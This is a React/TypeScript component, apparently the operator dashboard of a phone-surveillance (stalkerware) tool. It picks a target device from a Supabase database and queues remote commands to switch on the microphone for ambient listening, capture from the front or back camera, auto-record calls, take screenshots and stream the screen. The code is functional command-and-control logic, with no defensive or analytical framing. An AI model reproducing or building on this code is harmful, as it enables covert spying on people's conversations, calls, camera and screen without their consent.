import React, { useState, useEffect } from 'react';
import { Mic, Camera, Phone, Scan, Cast, Activity, Power, CheckCircle, XCircle, Loader } from 'lucide-react';
import { useTranslation } from 'react-i18next';
import { supabase } from '../../lib/supabase';

interface RemoteControlProps {
  type: 'mic' | 'camera' | 'calls' | 'screenshots' | 'stream';
}

const RemoteControl: React.FC<RemoteControlProps> = ({ type }) => {
  const { t } = useTranslation();
  const [loading, setLoading] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<any>(null);
  const [commandStatus, setCommandStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [statusMessage, setStatusMessage] = useState('');

  // Pegar dispositivo selecionado do localStorage ou primeiro disponível
  useEffect(() => {
    const fetchDevice = async () => {
      const savedDeviceId = localStorage.getItem('selectedDeviceId');

      const { data: devices } = await supabase
        .from('devices')
        .select('*')
        .order('last_seen', { ascending: false });

      if (devices && devices.length > 0) {
        const device = savedDeviceId
          ? devices.find(d => d.id === savedDeviceId) || devices[0]
          : devices[0];
        setSelectedDevice(device);
      }
    };

    fetchDevice();
  }, []);

  const getDetails = () => {
    switch (type) {
      case 'mic': return { title: t('sidebar.surroundings_listening'), icon: <Mic size={32} />, color: 'text-accent-yellow' };
      case 'camera': return { title: t('sidebar.remote_camera'), icon: <Camera size={32} />, color: 'text-accent-blue' };
      case 'calls': return { title: t('sidebar.call_recorder'), icon: <Phone size={32} />, color: 'text-accent-green' };
      case 'screenshots': return { title: t('sidebar.live_screenshots'), icon: <Scan size={32} />, color: 'text-accent-red' };
      case 'stream': return { title: t('sidebar.live_screen_streaming'), icon: <Cast size={32} />, color: 'text-accent-blue' };
      default: return { title: 'Unknown Module', icon: <Activity size={32} />, color: 'text-text-muted' };
    }
  };

  const details = getDetails();

  // Função principal para enviar comandos remotos
  const sendCommand = async (commandType: string, params: any = {}) => {
    if (!selectedDevice) {
      setCommandStatus('error');
      setStatusMessage('Nenhum dispositivo selecionado!');
      setTimeout(() => setCommandStatus('idle'), 3000);
      return;
    }

    setLoading(true);
    setCommandStatus('sending');
    setStatusMessage('Enviando comando...');

    try {
      const { data, error } = await supabase
        .from('remote_commands')
        .insert({
          device_id: selectedDevice.id,
          command_type: commandType,
          command_params: params,
          status: 'pending'
        })
        .select()
        .single();

      if (error) throw error;

      setCommandStatus('success');
      setStatusMessage(`Comando ${commandType} enviado com sucesso!`);

      // Resetar após 3 segundos
      setTimeout(() => {
        setCommandStatus('idle');
        setStatusMessage('');
      }, 3000);

    } catch (err: any) {
      console.error('Erro ao enviar comando:', err);
      setCommandStatus('error');
      setStatusMessage(`Erro: ${err.message || 'Falha ao enviar comando'}`);

      setTimeout(() => setCommandStatus('idle'), 3000);
    } finally {
      setLoading(false);
    }
  };

  // Handler específico para cada tipo de controle remoto
  const handleActivate = async () => {
    let commandType = '';
    let params: any = {};

    switch (type) {
      case 'mic':
        commandType = 'activate_mic';
        params = { duration: 60 }; // 60 segundos de gravação
        break;

      case 'camera':
        // Mostrar opções de câmera (frontal/traseira)
        const camera = confirm('Câmera frontal? (Cancele para traseira)') ? 'front' : 'back';
        commandType = 'camera_capture';
        params = { camera };
        break;

      case 'calls':
        commandType = 'record_call';
        params = { auto_record: true };
        break;

      case 'screenshots':
        commandType = 'take_screenshot';
        params = {};
        break;

      case 'stream':
        commandType = 'start_stream';
        params = { quality: 'medium' };
        break;

      default:
        setCommandStatus('error');
        setStatusMessage('Tipo de comando desconhecido');
        return;
    }

    await sendCommand(commandType, params);
  };

  return (
    <div className="flex-1 bg-bg-primary p-6 flex flex-col relative overflow-hidden">
      {/* Background Grid */}
      <div className="absolute inset-0 bg-[linear-gradient(rgba(45,55,72,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(45,55,72,0.1)_1px,transparent_1px)] bg-[size:40px_40px]"></div>

      <div className="relative z-10 flex items-center justify-between border-b border-border-color pb-4 mb-6">
        <div className="flex items-center gap-4">
          <div className={`p-3 bg-bg-secondary border border-border-color rounded ${details.color}`}>
            {details.icon}
          </div>
          <div>
            <h2 className="text-2xl font-tactical font-bold tracking-widest text-text-primary">
              {details.title}
            </h2>
            <p className="text-sm font-mono text-text-secondary">REMOTE ACCESS PROTOCOL // ENCRYPTED</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
            {selectedDevice ? (
              <>
                <span className="w-3 h-3 bg-accent-green rounded-full animate-pulse shadow-[0_0_10px_#00ff88]"></span>
                <span className="font-mono text-xs text-accent-green">
                  {selectedDevice.model} CONNECTED
                </span>
              </>
            ) : (
              <>
                <span className="w-3 h-3 bg-accent-red rounded-full"></span>
                <span className="font-mono text-xs text-accent-red">NO DEVICE</span>
              </>
            )}
        </div>
      </div>

      {/* Main Content Area - Mock Interface */}
      <div className="flex-1 bg-bg-secondary border border-border-color rounded-lg relative overflow-hidden flex items-center justify-center group">
        
        {/* CRT Effect Overlay */}
        <div className="absolute inset-0 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] z-20 bg-[length:100%_2px,3px_100%] pointer-events-none"></div>

        <div className="text-center space-y-6 relative z-30 p-8 bg-bg-tertiary/80 backdrop-blur border border-border-color rounded-xl max-w-md w-full shadow-2xl">
           <div className={`mx-auto w-24 h-24 rounded-full border-4 flex items-center justify-center ${details.color.replace('text-', 'border-')} opacity-50`}>
                {React.cloneElement(details.icon as React.ReactElement, { size: 48 })}
           </div>
           
           <div className="space-y-2">
               {commandStatus === 'idle' && (
                 <>
                   <h3 className="text-lg font-bold font-tactical text-text-primary">WAITING FOR COMMAND</h3>
                   <p className="text-xs font-mono text-text-secondary">
                       Establish a secure handshake to begin {type === 'stream' || type === 'calls' ? 'streaming' : 'capture'}.
                   </p>
                 </>
               )}

               {commandStatus === 'sending' && (
                 <>
                   <h3 className="text-lg font-bold font-tactical text-accent-yellow flex items-center justify-center gap-2">
                     <Loader className="animate-spin" size={20} />
                     SENDING COMMAND
                   </h3>
                   <p className="text-xs font-mono text-text-secondary">{statusMessage}</p>
                 </>
               )}

               {commandStatus === 'success' && (
                 <>
                   <h3 className="text-lg font-bold font-tactical text-accent-green flex items-center justify-center gap-2">
                     <CheckCircle size={20} />
                     COMMAND SENT
                   </h3>
                   <p className="text-xs font-mono text-accent-green">{statusMessage}</p>
                 </>
               )}

               {commandStatus === 'error' && (
                 <>
                   <h3 className="text-lg font-bold font-tactical text-accent-red flex items-center justify-center gap-2">
                     <XCircle size={20} />
                     ERROR
                   </h3>
                   <p className="text-xs font-mono text-accent-red">{statusMessage}</p>
                 </>
               )}
           </div>

           <button
             onClick={handleActivate}
             disabled={loading || !selectedDevice}
             className={`w-full py-4 border font-bold font-tactical transition-all flex items-center justify-center gap-2 ${
               loading || !selectedDevice
                 ? 'bg-bg-tertiary border-border-color text-text-muted cursor-not-allowed'
                 : commandStatus === 'success'
                 ? 'bg-accent-green/10 border-accent-green text-accent-green hover:bg-accent-green hover:text-bg-primary'
                 : commandStatus === 'error'
                 ? 'bg-accent-red/10 border-accent-red text-accent-red hover:bg-accent-red hover:text-bg-primary'
                 : 'bg-accent-blue/10 border-accent-blue text-accent-blue hover:bg-accent-blue hover:text-bg-primary shadow-[0_0_20px_rgba(0,212,255,0.3)]'
             }`}
           >
               {loading ? <Loader className="animate-spin" size={18} /> : <Power size={18} />}
               {loading ? 'SENDING...' : 'ACTIVATE MODULE'}
           </button>
        </div>

        {/* Terminal Output */}
        <div className="absolute bottom-4 left-4 right-4 h-32 bg-bg-primary/90 border border-border-color p-4 font-mono text-xs text-text-secondary overflow-hidden">
            <div className="space-y-1">
                <p>&gt; Initializing {type} module...</p>
                <p>&gt; Target: {selectedDevice ? `${selectedDevice.model} (${selectedDevice.id.slice(0, 8)}...)` : 'No device'}</p>
                <p>&gt; Encryption: AES-256 [ACTIVE]</p>
                {commandStatus === 'idle' && <p className="animate-pulse">&gt; Waiting for user input_</p>}
                {commandStatus === 'sending' && <p className="text-accent-yellow animate-pulse">&gt; Transmitting command to agent...</p>}
                {commandStatus === 'success' && <p className="text-accent-green">&gt; Command acknowledged by remote agent [OK]</p>}
                {commandStatus === 'error' && <p className="text-accent-red">&gt; Transmission failed [ERROR]</p>}
            </div>
        </div>

      </div>
    </div>
  );
};

export default RemoteControl;
